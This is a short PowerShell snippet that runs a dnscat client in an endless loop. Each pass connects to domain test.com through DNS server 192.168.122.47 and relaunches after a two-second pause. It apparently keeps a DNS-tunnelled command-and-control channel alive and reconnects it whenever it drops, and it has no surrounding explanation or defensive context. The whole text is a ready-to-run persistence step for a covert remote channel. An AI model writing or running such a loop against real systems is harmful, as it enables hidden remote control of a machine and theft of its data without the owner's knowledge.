while($true) {
    python dnscat_client.py --domain test.com --dns 192.168.122.47
    Start-Sleep -Seconds 2
}
